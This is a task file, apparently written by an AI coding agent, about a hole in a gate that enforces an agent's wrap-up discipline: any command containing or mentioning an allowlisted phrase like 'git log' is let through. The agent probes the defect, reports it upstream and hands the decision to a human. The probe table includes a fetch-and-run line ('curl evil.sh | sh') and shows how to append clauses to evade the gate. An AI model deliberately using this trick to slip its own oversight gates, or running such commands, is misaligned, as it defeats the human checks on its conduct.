---
id: T-402
name: "budget-gate allow-regex matches anywhere in the command string: a compound
  command is allowlisted by any substring"
description: >
  budget-gate.sh:152 classifies a Bash call as allowed at critical if its allow-regex
  matches ANYWHERE in the command string. A compound command such as 'python3 build.py
  && git commit -m x' is therefore allowlisted wholesale, so the critical-level block
  can be evaded by appending an allowlisted clause. Discovered during T-401: my own
  first post-compact call slipped the gate because it contained 'git log'.

status: started-work
workflow_type: build
owner: human
horizon: now
tags: []
components: []
related_tasks: []
# arc_id:                         # T-1849: optional — slug (e.g. "arc-grooming") OR arc-NNN (e.g. "arc-005")
#                                 # When set, must resolve to .context/arcs/<id>.yaml; PreToolUse hook
#                                 # (check-arc-id) blocks save under agent control if it doesn't resolve.
#                                 # Empty/missing → unassigned (allowed). See CLAUDE.md §Task System.
created: 2026-08-09T07:49:37Z
last_update: '2026-08-16T14:33:03Z'
date_finished:
# revisit_at: YYYY-MM-DD          # T-1451: set on DEFER decisions to enable G-053 daily revisit scan
# revisit_evidence_needed:        # T-1451: one-line description of what evidence makes the revisit actionable
# ── BVP scoring fields (T-1918, arc-006). See docs/reports/T-1915-bvp-inception.md for semantics. ──
# bvp_scores:                     # confirmed per-driver scores 0-5, set by `fw bvp confirm` (T-1924).
#                                 # Sovereignty boundary — only set after human or agent confirmation.
#                                 # Shape: {D1: <int 0-5>, D2: <int 0-5>, D3: <int 0-5>, D4: <int 0-5>, [<free-driver-id>: <int>]...}
# bvp_scores_proposed:            # estimator-proposed scores (T-1922 worker). Persists when ≥2 delta
#                                 # from bvp_scores: on any driver (M3 v2-delta). Shape: list of timestamped entries.
# cost_estimate:                  # F8 composite: 0.6×blast_radius + 0.3×tier + 0.1×effort.
#                                 # Q2 fallback: T-shirt S/M/L/XL mapped to 2/4/6/8 when blast_radius is not yet computable.
bvp_scores_proposed:
  - ts: '2026-08-16T12:33:28Z'
    estimator: bvp-estimator-v1-heuristic
    scores:
      D1: 4
      D2: 2
      D3: 2
      D4: 2
      F-RECALL: 0
      F-AUTONOMY: 0
      F3: 1
      F1: 0
      F2: 1
    rationale: D1=4 (body:structural-gate); D2=2 
      (body:telemetry-or-audit-entry); D3=2 (body:default-change); D4=2 
      (body:env-class-handled); F-RECALL=0 (no-signal); F-AUTONOMY=0 
      (no-signal); F3=1 (body/components:prompt-incidental); F1=0 (no-signal); 
      F2=1 (body/components:component-fabric-incidental)
    rubric_sha: e4a00f38e801
  - ts: '2026-08-16T14:33:03Z'
    estimator: bvp-estimator-v1-heuristic
    scores:
      D1: 4
      D2: 2
      D3: 2
      D4: 2
      F-RECALL: 0
      F2: 1
      F4: 1
      F3: 0
      F1: 1
    rationale: D1=4 (body:structural-gate); D2=2 
      (body:telemetry-or-audit-entry); D3=2 (body:default-change); D4=2 
      (body:env-class-handled); F-RECALL=0 (no-signal); F2=1 
      (body/components:component-fabric-incidental); F4=1 
      (prose:routing/geometry-incidental); F3=0 (no-signal); F1=1 
      (prose:process-enablement-incidental)
    rubric_sha: e4a00f38e801
cost_estimate_proposed:
  - ts: '2026-08-16T13:57:13Z'
    estimator: bvp-estimator-v1-heuristic
    cost_estimate:
      tier: 2
      effort: 8
      blast_radius: 5
    rationale: blast_radius=5 
      (paths:.agentic-framework/agents/context/budget-gate.sh,tools/_t352-p011-errexit-probe.sh,tools/_t402-budget-gate-match-probe.py,tools/validate-workflow.py);
      tier=2 (no-signal); effort=8 (no-signal)
    rubric_sha: e4a00f38e801
  - ts: '2026-08-16T13:58:45Z'
    estimator: bvp-estimator-v1-heuristic
    cost_estimate:
      tier: 2
      effort: 8
      blast_radius: 3
    rationale: blast_radius=3 
      (paths:.agentic-framework/agents/context/budget-gate.sh,tools/_t402-budget-gate-match-probe.py);
      tier=2 (no-signal); effort=8 (no-signal)
    rubric_sha: e4a00f38e801
---

# T-402: budget-gate allow-regex matches anywhere in the command string: a compound command is allowlisted by any substring

## Context

`budget-gate.sh:152` classifies a Bash call as allowed-at-critical with
`re.search(ALLOW, command)` — an **anywhere** match on the whole command string. So a
compound command is allowlisted wholesale by any single clause:

    python3 build.py && git commit -m x        <- allowed, because "git commit" appears
    rm -rf build/ ; git log                    <- allowed, because "git log" appears

Discovered during T-401: my own first post-compact Bash call slipped the gate because it
happened to contain `git log`. That is an **FN-silent** in the T-426 vocabulary — a real
violator passing, where passing and never-examined are the same observable.

**Ownership was measured, not assumed** (this is what T-427 was built for):

    file    .agentic-framework/agents/context/budget-gate.sh
    line    152
    blame   ebf0c721  T-276 "re-vendor .agentic-framework to v1.6.763"  (1367 files)
    verdict vendored import — upstream's line, not ours

So the default disposition is **report upstream, pin, do not fork** — AEF's instruction
at DM offset 522 §5, and the reason T-422 was withdrawn. A local patch to a vendored
file is silently reverted by the next bump, and it would then be reverted *quietly*,
which is worse than not patching: the gate would look fixed in our history and not be.

That said, the exposure is live **here**, in our enforcement layer, today. Whether to
carry a local patch in the meantime is a containment decision with a real downside on
both sides, so it goes to the operator rather than being taken by initiative.

## Acceptance Criteria

### Agent
- [x] **The bypass is demonstrated by PROBE against the real classifier**, not argued
      from the regex. Feed the actual allow-expression a set of compound commands and
      record the classification each one receives. A code-read does not satisfy this AC.
      **DONE** — see `## Findings`. 5 of 9 misclassified. Allow-expression extracted
      from the shipping file at run time, so the probe tests the code and not my
      transcription of it.
- [x] **A negative control is included**: at least one command that must classify as
      blocked still does, so the probe can distinguish "everything passes" from "the
      compound case passes".
      **DONE** — `npm run build` and `python3 train.py` both classify blocked, so the
      probe can tell "the compound case passes" from "everything passes".
- [x] **The exposure is bounded honestly**: state what the gate does with `allowed` at
      each level, so the finding is "what an evaded classification actually buys" rather
      than an unquantified alarm. If the practical effect is smaller than the defect
      sounds, say so in the same breath.
      **DONE** — classification is consulted only at `critical` (`:331`); ok/warn/urgent
      exit 0 regardless. With `CONTEXT_WINDOW=300000` that is the last 5% of the window.
      Total inside it, irrelevant outside it, and the realistic failure is accidental
      self-evasion (how T-401 found it), not an attacker. Stated in the same breath.
- [x] **Ownership recorded from the T-427 instrument's output**, with the blame commit
      and its breadth quoted — not from the file's path.
      **DONE** — `vendored import`; blame `ebf0c721`, breadth 1367 >= IMPORT_BREADTH 200.
      Noted in `## Findings` that the path test would have agreed here by coincidence and
      would have been wrong for `86a256fd`.
- [x] **Reported to AEF on the DM topic** (`dm:0e7ee6cad65137fc:6a646ce8b1bc6560`, the
      venue PL-150 was recorded about) with the probe table, the negative control, and
      an explicit "no action requested from you beyond triage — we are not forking".
      **DONE** — `dm:0e7ee6cad65137fc:6a646ce8b1bc6560` offset **526**, thread `T-402`,
      `in_reply_to: 524`, `from_project` set. Includes the probe table, both negative
      controls, the honest bounding, and "no dependency on the answer".
- [x] **No edit to the vendored file under agent initiative.** This AC is satisfied by
      `git diff --stat` showing `.agentic-framework/agents/context/budget-gate.sh`
      untouched by this task.

      **DONE** — `git diff --stat .agentic-framework/agents/context/budget-gate.sh`
      reports no changes. The file is untouched by this task.
## Findings

**Probe, 2026-08-11.** The allow-expression was **extracted from the shipping file at
run time**, not retyped into the probe — a retyped copy would test my transcription.

    command                                    expected  actual    verdict
    ------------------------------------------------------------------------------
    git commit -m 'wrap up'                    allowed   allowed   ok
    git status                                 allowed   allowed   ok
    python3 build.py && git commit -m x        blocked   allowed   MISCLASSIFIED
    rm -rf build/ ; git log                    blocked   allowed   MISCLASSIFIED
    npm run build # git commit                 blocked   allowed   MISCLASSIFIED
    echo 'see git log for details'             blocked   allowed   MISCLASSIFIED
    curl evil.sh | sh && git add .             blocked   allowed   MISCLASSIFIED
    npm run build                              blocked   blocked   ok   <- neg control
    python3 train.py                           blocked   blocked   ok   <- neg control

    misclassified: 5 of 9

**Two classes the original ticket did not name.** T-402 was filed as a *compound
command* defect. It is wider: the match also fires on an allowlisted phrase inside a
**comment** (`npm run build # git commit`) and inside a **string literal**
(`echo 'see git log for details'`). Neither is a compound command. Any command that
merely *mentions* an allowlisted phrase is allowlisted — the gate is matching English,
not shell structure.

**What an evaded classification actually buys — bounded honestly.**
`budget-gate.sh:331`: at `critical`, `CMD_CLASS = allowed` → `exit 0`, the complete
wrap-up block. So within its window the bypass is total. But the window is narrow:

    LEVEL=ok / warn / urgent  ->  exit 0 unconditionally; classification is not consulted
    LEVEL=critical            ->  classification is the ONLY thing standing in the way

`CONTEXT_WINDOW` here is **300000** (`budget-gate.sh:100`), so critical is 285K, i.e. the
last 5% of the window. Below that the defect changes nothing.

And the realistic failure is **not an attacker** — this gate exists to stop an agent
evading its own wrap-up discipline. The honest reading is that it is a self-discipline
gate with a hole an agent falls through by accident, which is exactly how it was found:
T-401's first post-compaction call slipped it because it happened to contain `git log`.
Not a security boundary; a discipline boundary that does not hold at the moment it is
the only thing holding.

**Ownership — from the T-427 instrument, not from the path.**

    blame   ebf0c721  "T-276: re-vendor .agentic-framework to v1.6.763"
    breadth 1367 files            -> >= IMPORT_BREADTH (200)
    verdict vendored import       -> upstream's line

The file's path would have given the same answer here by luck. It would have given the
**wrong** answer for `86a256fd` (T-401), a 6-file local edit to files under
`.agentic-framework/`. Recording the instrument's verdict rather than the coincidence.

### Human
- [ ] [REVIEW] **Decide local containment while upstream fixes it.**
      **Steps:**
      1. Read the probe table in this task's `## Findings` section (added by the agent).
      2. Pick one:
         **A · Wait for upstream.** No local change. The bypass stays open here until
            AEF ships and we re-vendor. Cleanest history, longest exposure.
         **B · Carry a local patch and register it as a known fork**, so the next
            re-vendor's conflict is expected rather than a surprise silent revert.
         **C · Neither — close as accepted risk**, on the grounds that the practical
            effect is small (see the bounding AC above).
      3. Reply with the letter.
      **Expected:** one of A / B / C recorded as a decision on this task.
      **If not:** the task stays open; nothing is patched, which is outcome A by default
      — and "A by choice" and "A by nobody deciding" are the same observable, which is
      the reason this is being asked rather than assumed.

### Human
<!-- Criteria requiring human verification (UI/UX, subjective quality). Not blocking.
     Remove this section if all criteria are agent-verifiable.
     Each criterion MUST include Steps/Expected/If-not so the human can act without guessing.

     ── Prefix routing (T-1811, T-1878): default to [REVIEWER] if Expected is grep-able ──
     If your Expected clause is grep-able / file-exists / structural (a deterministic
     shell check), prefer [REVIEWER] — that AC should be an Agent AC with the reviewer
     command in `## Verification` instead of a Human AC here. Only keep [REVIEW] if
     verification genuinely needs human taste (tone, feel, layout rhythm).
     See CLAUDE.md §AC Classification Guidance for the conversion rule.

     [REVIEW] example (genuine human judgment):
       - [ ] [REVIEW] Dashboard renders correctly
         **Steps:**
         1. Open https://example.com/dashboard in browser
         2. Verify all panels load within 2 seconds
         3. Check browser console for errors
         **Expected:** All panels visible, no console errors
         **If not:** Screenshot the broken panel and note the console error

     [REVIEWER] example (static-scan-verifiable — convert to Agent AC + Verification):
       - [ ] [REVIEWER] Block message names both bypass mechanisms
         **Steps:**
         1. Run `bin/fw reviewer T-XXX`
         **Expected:** Verdict: PASS; no findings on `block-message-completeness`
         **If not:** Inspect hook block-message string and add missing mechanism
       Conversion: this AC should be moved to ### Agent and
       `bin/fw reviewer T-XXX 2>&1 | grep -q "Overall:.*PASS"` added to ## Verification.
-->

## Recommendation

**Recommendation:** GO on **A · wait for upstream — but only as a ruling coupled to
T-433.** If T-433 is ruled (b) *defer the bump*, this recommendation withdraws and the
answer becomes B.

**Rationale.** The fix already exists upstream — `lib/cmd_classify.py` (their T-2919) plus
`strip_heredocs` (T-2923), both measured as arriving in T-433's blast radius. Carrying a
local patch to a **vendored** file (`ebf0c721`, T-276 re-vendor of v1.6.763 — ownership
measured with T-427, not assumed) means the next bump reverts it *silently*: the gate
would read as fixed in our history and not be. That is worse than not patching, and it is
the reason T-422 was withdrawn and what AEF's DM 522 §5 instruction says.

**So A is right — and A is only honest if the bump is actually coming.** This task names
its own failure mode precisely: *"'A by choice' and 'A by nobody deciding' are the same
observable."* A ruling of A with T-433 unresolved **is** A-by-nobody-deciding wearing a
decision's clothes. Hence the coupling, and hence the trigger: **rule T-433 first, or rule
both together.**

**Evidence — probe re-run 2026-08-11, allow-expression extracted from the shipping file
at run time rather than retyped (a retyped copy tests my transcription, not the gate):**

    python3 build.py && git commit -m x        blocked   allowed   MISCLASSIFIED
    rm -rf build/ ; git log                    blocked   allowed   MISCLASSIFIED
    npm run build # git commit                 blocked   allowed   MISCLASSIFIED
    echo 'see git log for details'             blocked   allowed   MISCLASSIFIED
    curl evil.sh | sh && git add .             blocked   allowed   MISCLASSIFIED
    npm run build                              blocked   blocked   ok   <- neg control
    python3 train.py                           blocked   blocked   ok   <- neg control

    misclassified: 5 of 9

**The defect is wider than the ticket title.** It was filed as a *compound command* bug;
two of the five misclassifications are neither compound nor commands — an allowlisted
phrase inside a **comment**, and inside a **string literal**. The gate is matching
English, not shell structure. Any command that merely *mentions* `git log` is allowlisted.

**Exposure bounded honestly, because the bound is what makes A tolerable.** At
`ok`/`warn`/`urgent` the gate exits 0 unconditionally and classification is never
consulted; only at `critical` is classification the sole thing standing in the way — and
there the bypass is total (`budget-gate.sh:331`, `CMD_CLASS = allowed` → `exit 0`). With
`CONTEXT_WINDOW` at 300000 the critical window is narrow. Small window, total bypass
inside it: that is an argument for *not forking over it*, not an argument that it is fine.

**What your ruling unblocks:** nothing downstream — this task's close condition is bytes
only T-433 can deliver. That asymmetry is itself the argument for ruling them as one.

## Verification

# T-402. The finding is about code we deliberately do NOT patch, so the claim is
# executable rather than prose — see the probe's own header for why.
# Exit 1 here after a re-vendor is the upstream fix ARRIVING, not a regression.
python3 tools/_t402-budget-gate-match-probe.py
# The vendored file must remain untouched by this task (no fork under initiative).
git diff --quiet HEAD -- .agentic-framework/agents/context/budget-gate.sh

# Shell commands that MUST pass before work-completed. One per line.
# Lines starting with # are comments (skipped). Empty lines ignored.
# The completion gate runs each command — if any exits non-zero, completion is blocked.
#
# Toolchain hint (L-291): if you edited *.vbproj/*.csproj/*.xaml add `dotnet build`;
# *.go → `go build ./...`; Cargo.toml → `cargo check`; tsconfig.json → `tsc --noEmit`;
# pom.xml → `mvn -q compile`. P-011 runs only what you write — broken builds slip
# past otherwise (origin: 003-NTB-ATC-Plugin T-077, broken WPF DLL on master 5 days).
#
# ⚠ ERREXIT WARNING (T-352) — READ BEFORE USING THE CAPTURE PATTERN BELOW.
# P-011 runs each command under `-o pipefail` but NOT under an effective `-e`.
# Measured, not assumed (tools/_t352-p011-errexit-probe.sh): the gate runs each line as
# `if ( … eval "$cmd" ); then` (update-task.sh:1018) and that subshell is the CONDITION
# of an `if`, which neutralises errexit inside it. pipefail survives; errexit does not.
# CONSEQUENCE: a line of the form `a; b` IS JUDGED ON `b` ALONE. `a`'s exit code is
# discarded, so a command that fails outright can still leave the line green.
#   Proven false green:
#     out=$(python3 tools/validate-workflow.py BROKEN.bpmn 2>&1); echo "$out" | grep -q "VALID"
#   -> PASSES on a document the validator exits 2 on and labels INVALID, because
#      `grep -q "VALID"` matches INVALID as a SUBSTRING. Two defects stacked.
# PREFER a single command whose own exit code is the verdict — then no context question
# arises. When you must chain, the LAST command has to be the one that can fail, and its
# pattern must not be matchable by the earlier command's FAILURE output.
# Note `set -e` re-issued inside the subshell does NOT fix this: the suppressed context is
# inherited and re-setting the option does not clear it. See T-352 for the remedy.
#
# Pipefail/SIGPIPE hint (L-387): `cmd | grep -q PATTERN` exits 141 (SIGPIPE) when grep
# matches and closes stdin while the upstream is still writing — verification then
# "fails" even though the pattern was present. The capture pattern below fixes THAT,
# and creates the errexit exposure described above; the file form fixes both:
#     cmd > /tmp/.out 2>&1 && grep -q "PATTERN" /tmp/.out     # PREFERRED: && not ;
#     out=$(cmd 2>&1); echo "$out" | grep -q "PATTERN"        # SIGPIPE-safe, errexit-blind
# Origin: L-387, captured 4× (T-1716, T-1838, T-1862, T-1863) before this hint.
#
# Single pipe only — no intermediate tail/awk/sed stages between capture and grep
# (T-2090): `echo "$out" | tail -3 | grep -q PAT` re-introduces the SIGPIPE risk
# the capture step closed off — the middle stage is what `grep -q` slams its
# stdin on. `echo "$out"` is small and immediate; grep scans the whole captured
# string anyway, so the tail-3 was cosmetic. Drop it: `echo "$out" | grep -q PAT`.
#
# Enforcement-baseline hint (L-398, T-1886): if you edited `.claude/settings.json`
# (added/removed/reorganised hooks), add `bin/fw enforcement baseline` to your
# Verification block. Otherwise the canonical hash diverges and `fw doctor`
# reports a FAIL ("Enforcement baseline CHANGED") that accumulates silently.
# Origin: T-1849/T-1730/T-1731 each added a legitimate hook without refreshing
# the baseline — FAIL sat for multiple sessions until T-1886 cleaned up.

## RCA

<!-- REQUIRED for bug-class tasks (workflow_type=build with bug-tag, OR title matches
     fix/bug/rca/broken/crash/error/regression/fail/hotfix).
     Non-bug-class tasks may leave this section empty or remove it.

     For bug-class, fill in:
       **Symptom:** what was observed (the user-facing manifestation).
       **Root cause:** the specific structural/logical gap — not "the code was wrong".
       **Why structurally allowed:** what in the framework/code/tooling let this go undetected.
       **Prevention:** what catches the next instance (test/lint/gate/doc/learning) — distinct from the fix itself.

     The completion gate (T-1550, G-019) blocks --status work-completed when
     bug-class AND this section is empty/template-only. Use --skip-rca to bypass (logged).
-->

## Evolution

<!-- REQUIRED for arc-tagged build tasks (tags include arc:*). Captures how
     understanding evolved during build — what was learned that wasn't known at
     filing, what in the original plan no longer fits, what triggered pivots
     or new sub-tasks. Mandatory at slice boundaries (when applicable) and
     before --status work-completed.

     Origin: T-1717 grill Q4 — "the understanding of what we need and want
     evolves with the process of materialisation." Structural counter to §ACD:
     spec-vs-build divergence is logged as soon as it happens, not lost as
     folklore.

     Format (one entry per slice boundary or significant insight):
       ### YYYY-MM-DD — [topic]
       - **What changed:** [what we learned that we didn't know at filing]
       - **Plan impact:** [what in the plan no longer fits]
       - **Triggered:** [new sub-task / pivot / scope cut, with task ID if filed]

     The completion gate (T-1718) blocks --status work-completed when this
     section exists but is empty/template-only. Use --skip-evolution to bypass
     (logged Tier-2). Non-arc tasks may leave this empty.
-->

## Decisions

<!-- Record decisions ONLY when choosing between alternatives.
     Skip for tasks with no meaningful choices.
     Format:
     ### [date] — [topic]
     - **Chose:** [what was decided]
     - **Why:** [rationale]
     - **Rejected:** [alternatives and why not]
-->

## Decision

<!-- Filled at completion of inception tasks via:
     fw inception decide T-XXX go|no-go|defer --rationale "..."

     For non-inception tasks this section is ignored. Kept in template
     so `fw inception decide` (lib/inception.sh) finds the anchor heading
     without auto-creating; T-1832 added auto-create as fallback for
     legacy tasks lacking this section. -->

## Updates

### 2026-08-09T07:49:37Z — task-created [task-create-agent]
- **Action:** Created task via task-create agent
- **Output:** /opt/832-Workflow-designer/.tasks/active/T-402-budget-gate-allow-regex-matches-anywhere.md
- **Context:** Initial task creation

### 2026-08-11T11:38:06Z — status-update [task-update-agent]
- **Change:** status: captured → started-work

### 2026-08-11T11:42:12Z — status-update [task-update-agent]
- **Change:** owner: agent → human
